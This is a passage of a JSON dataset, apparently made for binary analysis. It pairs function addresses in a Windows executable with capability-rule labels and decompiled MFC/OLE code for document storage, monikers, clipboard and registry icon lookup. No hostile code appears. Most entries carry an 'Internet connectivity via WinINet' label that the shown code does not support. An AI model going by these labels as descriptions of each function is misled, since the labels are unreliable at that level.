break;\n        arg_8h_00 = -0x7ff8fff2;\n        in_ECX = piVar3;\n        ppiVar4 = ppiStack72;\n    }\n    return;\n}\n",
        "token_count": 683
    },
    "0044d84a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d84a(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint var_54h;\n    uint hMem;\n    uint var_4ch;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    piVar1 = fcn.00431b02(in_ECX[9], 0x4a1088);\n    if (*(in_ECX[8] + 0x78) == 0) {\n        iVar2 = (**(*piVar1 + 0x10))(piVar1);\n        if (iVar2 != 0) goto code_r0x0044d8a4;\n    }\n    (*_sym.imp.ole32.dll_OleSave)(piVar1, in_ECX[0xe], *(in_ECX[8] + 0x78) == 0);\n    (**(*piVar1 + 0x20))(piVar1, 0);\ncode_r0x0044d8a4:\n    (**(*piVar1 + 8))(piVar1);\n    (**(*in_ECX[0xe] + 0x24))(in_ECX[0xe], 1);\n    iVar2 = (*_sym.imp.ole32.dll_GetHGlobalFromILockBytes)(in_ECX[0xf], &hMem);\n    if (iVar2 == 0) goto code_r0x0044d8cc;\n    do {\n        fcn.00413258(iVar2);\ncode_r0x0044d8cc:\n        in_ECX = in_ECX[0xf];\n        iVar2 = (**(*in_ECX + 0x24))(in_ECX, &var_4ch, 1);\n    } while (iVar2 != 0);\n    fcn.00410320(var_44h);\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_GlobalLock)(hMem);\n    fcn.00429fd7(arg_8h_00, var_44h);\n    (*_sym.imp.KERNEL32.dll_GlobalUnlock)(hMem);\n    fcn.0045e747(var_44h);\n    return;\n}\n",
        "token_count": 519
    },
    "0044dcb2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0044dcb2(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack584;\n    char *pcStack580;\n    uint uStack576;\n    uchar *puStack572;\n    char *pcStack560;\n    uchar *puStack556;\n    int32_t iStack552;\n    uchar *puStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint uStack536;\n    uint uStack532;\n    uint in_stack_fffffdf0;\n    uchar auStack272 [264];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ &stack0xfffffde8;\n    uStack536 = 0x24;\n    puStack540 = 0x44dcd6;\n    fcn.004627af();\n    puStack540 = &stack0xfffffdb8;\n    uStack544 = param_1;\n    iStack552 = 0;\n    uStack576 = 0;\n    puStack548 = 0x44dcef;\n    iVar2 = (*_sym.imp.ole32.dll_StringFromCLSID)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExA;\n    if (iVar2 < 0) goto code_r0x0044de8c;\n    puStack548 = &stack0xfffffdbc;\n    iStack552 = 0x20019;\n    puStack556 = NULL;\n    pcStack560 = \"clsid\";\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar2 == 0) {\n        puStack572 = 0x44dd2a;\n        fcn.00413a89(puStack584);\n        puStack584 = &stack0xfffffdd4;\n        uStack576 = 0x20019;\n        pcStack580 = NULL;\n        puStack540 = NULL;\n        puStack572 = puStack584;\n        iVar2 = (*pcVar1)(0);\n        if (iVar2 == 0) {\n            iVar2 = (*pcVar1)(puStack556, \"DefaultIcon\", 0, 0x20019, &stack0xfffffdd0);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)\n                                  (pcStack560, 0, 0, &stack0xfffffdc0, &stack0xfffffef0, &stack0xfffffdc8);\n                if (iVar2 == 0) {\n                    fcn.0044cf8b();\n                    iVar2 = fcn.0043026e();\n                    iStack552 = (*_sym.imp.SHELL32.dll_ExtractIconA)\n                                          (*(*(iVar2 + 4) + 0x44), &stack0xfffffde8, 0x80000000);\n                    if (iStack552 == 1) {\n                        iStack552 = 0;\n                    }\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(pcStack560);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puStack556);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(pcStack580);\n        puStack540 = 0xffffffff;\n        fcn.00402740();\n        if (iStack552 == 0) goto code_r0x0044dde6;\n    }\n    else {\ncode_r0x0044dde6:\n        puStack572 = 0x20019;\n        uStack576 = 0;\n        pcStack580 = \"DocShortcut\";\n        puStack584 = 0x80000000;\n        iVar2 = (*pcVar1)();\n        if (iVar2 == 0) {\n            puStack572 = 0x20019;\n            uStack576 = 0;\n            pcStack580 = \"DefaultIcon\";\n            puStack584 = puStack556;\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)\n                                  (pcStack560, 0, 0, &stack0xfffffdc0, &stack0xfffffef0, &stack0xfffffdc8);\n                if (iVar2 == 0) {\n                    fcn.0044cf8b();\n                    iVar2 = fcn.0043026e();\n                    iStack552 = (*_sym.imp.SHELL32.dll_ExtractIconA)\n                                          (*(*(iVar2 + 4) + 0x44), &stack0xfffffde8, 0x80000000);\n                    if (iStack552 == 1) {\n                        iStack552 = 0;\n                    }\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(pcStack560);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puStack556);\n        }\n    }\n    puStack572 = 0x44de89;\n    (*_sym.imp.ole32.dll_CoTaskMemFree)();\ncode_r0x0044de8c:\n    *in_FS_OFFSET = puStack548;\n    uStack532 = 0x44dea7;\n    fcn.0045e747(in_stack_fffffdf0);\n    return;\n}\n",
        "token_count": 1163
    },
    "0044ea0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0044ea0e(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint unaff_retaddr;\n    \n    *(param_1 + 0x90) = *(param_1 + 0x90) + -1;\n    if (*(param_1 + 0x94) != 0) {\n        if (param_2 == 0) {\n            unaff_retaddr = fcn.00412c11(*(param_1 + 0x94));\n        }\n        piVar1 = *(param_1 + 0x94) + 4;\n        *piVar1 = *piVar1 + 1;\n        fcn.00411d27();\n        *(param_1 + 0x94) = 0;\n    }\n    return unaff_retaddr;\n}\n",
        "token_count": 191
    },
    "0044f017": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f017(int32_t *param_1)\n\n{\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x26] != 0) {\n        var_4h = NULL;\n        (*_sym.imp.ole32.dll_GetRunningObjectTable)(0, &var_4h);\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x10))(var_4h, param_1[0x26]);\n            (**(*var_4h + 8))(var_4h);\n        }\n        param_1[0x26] = 0;\n    }\n    fcn.00431b26(param_1 + 0x27);\n    fcn.00413a3a(0x4939a0);\n    return;\n}\n",
        "token_count": 195
    },
    "0044f150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044f150(int32_t *param_1, int32_t param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00431b42(0x4a0a08, param_2, param_3);\n    (*_sym.imp.ole32.dll_CoLockObjectExternal)(uVar1);\n    if ((param_2 != 0) && (*(param_1[9] + -0xc) != 0)) {\n        fcn.0044f017();\n        (**(*param_1 + 0xe8))(param_1[9], 0);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0044f372": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044f372(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    int32_t ppmk;\n    \n    if (*(*(in_ECX + 0xa0) + -0xc) == 0) {\n        ppmk = fcn.00451631(arg_8h);\n    }\n    else {\n        ppmk = in_ECX;\n        puVar1 = fcn.0041442c(*(in_ECX + 0xa0));\n        (*_sym.imp.ole32.dll_CreateFileMoniker)(*puVar1, &ppmk);\n        fcn.00402740();\n    }\n    return ppmk;\n}\n",
        "token_count": 154
    },
    "0044f3b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f3b3(int32_t *pprot, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = in_ECX + 0x27;\n    in_ECX[0x23] = pprot;\n    var_4h = 1;\n    fcn.00431b26(piVar1);\n    fcn.0041372f();\n    if (arg_ch != 0) {\n        puVar2 = fcn.0041442c(arg_ch);\n        iVar3 = (*_sym.imp.ole32.dll_CreateFileMoniker)(*puVar2, piVar1);\n        pprot = pprot & 0xffffff | (iVar3 != 0) << 0x18;\n        fcn.00402740();\n        if (pprot._3_1_ != '\\0') {\n            var_4h = 0;\n        }\n    }\n    if (*piVar1 != 0) {\n        pprot = NULL;\n        (*_sym.imp.ole32.dll_GetRunningObjectTable)(0, &pprot);\n        iVar3 = (**(*pprot + 0x18))(pprot, *piVar1, &var_ch);\n        if (iVar3 == 0) {\n            (**(*var_ch + 8))(var_ch);\n            fcn.00431b26(piVar1);\n            return 0;\n        }\n        iVar3 = *pprot;\n        uVar4 = fcn.00431b42(0x4a0a08, *piVar1, in_ECX + 0x26);\n        iVar3 = (**(iVar3 + 0xc))(pprot, 0, uVar4);\n        (**(*pprot + 8))(pprot);\n        fcn.00413a3a(arg_ch);\n        if (iVar3 != 0) {\n            var_4h = 0;\n        }\n    }\n    var_8h = (**(*in_ECX + 0xb4))();\n    while (iVar3 = fcn.00450d9b(),  iVar3 != 0) {\n        if (*(iVar3 + 0x45) != '\\0') {\n            (**(**(iVar3 + 0x24) + 0x1c))(*(iVar3 + 0x24), 1, *piVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 577
    },
    "0044f751": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f751(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x24) == 0) {\n        uVar1 = 0x80004001;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x24) + 0xfc))(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "00450d63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00450d63(int32_t *param_1, int32_t *param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    do {\n        if (*param_2 == 0) {\n            return 0;\n        }\n        uVar1 = (**(*param_1 + 0xb8))(param_2);\n        iVar2 = fcn.0042f538(param_4);\n    } while (iVar2 == 0);\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "00450dbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450dbd(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0xb4))();\n    while( true ) {\n        puVar2 = &var_4h;\n        piVar1 = fcn.00450d9b();\n        if (piVar1 == NULL) break;\n        if (piVar1[9] != 0) {\n            (**(*piVar1 + 0x58))(1);\n            (**(*param_1 + 0xc0))(piVar1);\n            fcn.00431cc2(puVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00450e08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450e08(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    var_4h = (**(*in_ECX + 0xb4))();\n    piVar2 = fcn.00450d9b(&var_4h);\n    while (piVar2 != NULL) {\n        if ((*(piVar2 + 0x47) != '\\0') && (arg_ch != NULL)) {\n            piVar1 = piVar2[0x13];\n            if (piVar1 != NULL) {\n                (**(*piVar1 + 8))(piVar1);\n            }\n            (**(*arg_ch + 4))(arg_ch);\n            piVar2[0x13] = arg_ch;\n        }\n        (**(*piVar2 + 0xdc))(arg_8h);\n        piVar2 = fcn.00450d9b(&var_4h);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00450f46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450f46(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    var_4h = param_1;\n    iVar1 = fcn.00428a3b();\n    if (iVar1 == 0) {\ncode_r0x00450f56:\n        uVar2 = 0;\n    }\n    else {\n        if ((*(param_1 + 0x78) != 0) && (*(param_1 + 0x50) == 0)) {\n            fcn.00431b26(param_1 + 0x7c);\n            iVar1 = (*_sym.imp.ole32.dll_StgCreateDocfile)(0, 0x4011012, 0, &var_4h);\n            if (iVar1 != 0) goto code_r0x00450f56;\n            *(param_1 + 0x7c) = var_4h;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00451032": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00451032(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00451015(param_1);\n    }\n    return uVar1;\n}\n",
        "token_count": 72
    },
    "00451122": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00451122(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar3;\n    \n    iVar3 = 8;\n    fcn.004627af(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.COleDocument.0;\n    pcVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        iVar3 = unaff_EBP + -0x10;\n        piVar2 = fcn.00451032();\n        if (piVar2 != NULL) {\n            (**(*piVar2 + 4))(1);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    fcn.00431b26(extraout_ECX + 0x1f, iVar3);\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[0x22]);\n    fcn.00432f21();\n    *(unaff_EBP + -4) = 0;\n    fcn.00457cba();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428ac6();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 375
    },
    "00451345": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.00451345(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_88h;\n    uint var_84h;\n    int32_t var_40h;\n    uint in_stack_ffffffcc;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x80);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.00458294(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.004292e0(0, 0xffffffff, 0);\n    iVar1 = extraout_ECX[0x1f];\n    *(unaff_EBP + -4) = 1;\n    iVar1 = fcn.0045860e(iVar1, \"Contents\", 0x1012, unaff_EBP + -0x28);\n    if (iVar1 == 0) {\n        if (*(unaff_EBP + -0x20) == 2) {\n            var_28h = 7;\n            fcn.004299a5(7, 0);\n        }\n        in_stack_ffffffcc = *(unaff_EBP + -0x20);\n        fcn.004416ff(in_stack_ffffffcc, *(unaff_EBP + -0x1c), var_28h);\n    }\n    fcn.0042a2d4(unaff_EBP + -0x40, 2, 0x1000, in_stack_ffffffcc);\n    *(unaff_EBP + -0x88) = extraout_ECX;\n    *(unaff_EBP + -0x84) = 0;\n    *(unaff_EBP + -4) = 3;\n    if (*(unaff_EBP + 8) == NULL) {\n        iVar1 = *extraout_ECX;\n    }\n    else {\n        iVar1 = **(unaff_EBP + 8);\n    }\n    var_40h = unaff_EBP + -0x88;\n    (**(iVar1 + 8))(var_40h);\n    fcn.00429fc9();\n    fcn.0045801a();\n    iVar1 = (**(*extraout_ECX[0x1f] + 0x24))(extraout_ECX[0x1f], 2);\n    if (iVar1 != 0) {\n        fcn.00413258(iVar1);\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.0042a214();\n    *(unaff_EBP + -0x28) = vtable.CFileException.0;\n    fcn.00402740();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00458056();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 789
    },
    "00451631": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00451631(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t ppmk;\n    int32_t lpszPathName;\n    \n    if (*(*(param_1 + 0x24) + -0xc) == 0) {\n        iVar1 = 0;\n    }\n    else {\n        ppmk = param_1;\n        lpszPathName = param_1;\n        fcn.0041442c(*(param_1 + 0x24));\n        (*_sym.imp.ole32.dll_CreateFileMoniker)(lpszPathName, &ppmk);\n        iVar1 = ppmk;\n        fcn.00402740();\n    }\n    return iVar1;\n}\n",
        "token_count": 161
    },
    "0045166f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0045166f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x20);\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    if ((extraout_ECX[0x1e] == 0) && (extraout_ECX[0x1f] == 0)) {\n        fcn.0042933f(*(unaff_EBP + 8));\n    }\n    else {\n        (**(*extraout_ECX + 0x58))();\n        iVar3 = *(unaff_EBP + 8);\n        if (iVar3 != 0) {\n            (**(*extraout_ECX + 0x6c))();\n            fcn.00431b26(extraout_ECX + 0x1f);\n        }\n        (**(*extraout_ECX + 0x5c))(1);\n        iVar1 = extraout_ECX[0x1f];\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        if (iVar1 == 0) {\n            fcn.0041442c(iVar3);\n            uVar4 = -(iVar3 != 0) & *(unaff_EBP + -0x18);\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x20) = uVar4;\n            *(unaff_EBP + -0x14) = 0;\n            iVar3 = (*_sym.imp.ole32.dll_StgIsStorageFile)(uVar4);\n            pcVar2 = _sym.imp.ole32.dll_StgOpenStorage;\n            if (iVar3 == 1) {\n                iVar3 = (*_sym.imp.ole32.dll_StgCreateDocfile)(uVar4, 0x30022);\n            }\n            else {\n                iVar3 = (*_sym.imp.ole32.dll_StgOpenStorage)(uVar4, 0, 0x10022, 0, 0, unaff_EBP + -0x14);\n                if ((iVar3 < 0) || (*(unaff_EBP + -0x14) == 0)) {\n                    iVar3 = (*pcVar2)(*(unaff_EBP + -0x20), 0, 0x10000, 0, 0, unaff_EBP + -0x14);\n                }\n            }\n            if (iVar3 < 0) {\n                fcn.00413258(iVar3);\n            }\n            extraout_ECX[0x1f] = *(unaff_EBP + -0x14);\n            *(unaff_EBP + -4) = 0;\n            fcn.00402740();\n        }\n        (**(*extraout_ECX + 0xd8))();\n        (**(*extraout_ECX + 0x5c))(0);\n        *(unaff_EBP + -0x1c) = 1;\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 853
    },
    "00452c4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c4f(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    fcn.00431b26(param_1 + 1);\n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[3] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    param_1[2] = NULL;\n    return;\n}\n",
        "token_count": 119
    },
    "00452ca6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00452ca6(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t **in_ECX;\n    uint var_14h;\n    \n    if (in_ECX[2] == NULL) {\n        uVar2 = fcn.00412d0c(arg_ch, arg_8h, &var_14h);\n        iVar3 = (**(**in_ECX + 0x14))(*in_ECX, uVar2);\n        uVar1 = iVar3 == 0;\n    }\n    else {\n        uVar1 = (*_sym.imp.USER32.dll_IsClipboardFormatAvailable)(arg_8h & 0xffff);\n    }\n    return uVar1;\n}\n",
        "token_count": 179
    },
    "00452d04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452d04(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    if ((param_1[2] != 0) && (*param_1 == 0)) {\n        var_4h = param_1;\n        iVar1 = (*_sym.imp.ole32.dll_OleGetClipboard)(&var_4h);\n        if (iVar1 == 0) {\n            fcn.00452ceb(var_4h, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00452d46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00452d46(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    \n    fcn.00452d04();\n    piVar1 = *param_1;\n    if ((param_2 != 0) && (piVar1 != NULL)) {\n        (**(*piVar1 + 4))(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 102
    },
    "00452d8b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00452d8b(uint arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    int32_t **in_ECX;\n    uint var_2ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00452d04();\n    if (*in_ECX == NULL) {\n        return 0;\n    }\n    puVar1 = fcn.00412d0c(arg_ch, arg_8h, &var_2ch);\n    if (arg_ch == 0) {\n        *(puVar1 + 8) = 0x21;\n    }\n    iVar2 = (**(**in_ECX + 0xc))(*in_ECX, puVar1, &var_ch);\n    if (-1 < iVar2) {\n        if ((var_ch == 1) || (var_ch == 0x20)) {\n            if (var_4h == 0) {\n                return var_8h;\n            }\n            var_18h = 0;\n            var_10h = 0;\n            iVar2 = fcn.00413af1(*puVar1, &var_18h, &var_ch);\n            if (iVar2 != 0) {\n                (*_sym.imp.ole32.dll_ReleaseStgMedium)(&var_ch);\n                return var_14h;\n            }\n        }\n        (*_sym.imp.ole32.dll_ReleaseStgMedium)();\n    }\n    return 0;\n}\n",
        "token_count": 364
    },
    "00452e32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
